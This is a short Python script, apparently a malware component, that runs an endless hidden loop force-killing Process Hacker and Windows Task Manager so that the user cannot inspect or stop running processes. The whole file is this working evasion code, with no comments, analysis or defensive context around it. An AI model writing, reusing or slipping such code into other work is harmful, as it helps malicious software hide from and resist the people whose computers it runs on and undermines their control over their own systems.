import subprocess

while True:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call('taskkill /F /IM processhacker.exe', creationflags=CREATE_NO_WINDOW)
        subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=CREATE_NO_WINDOW)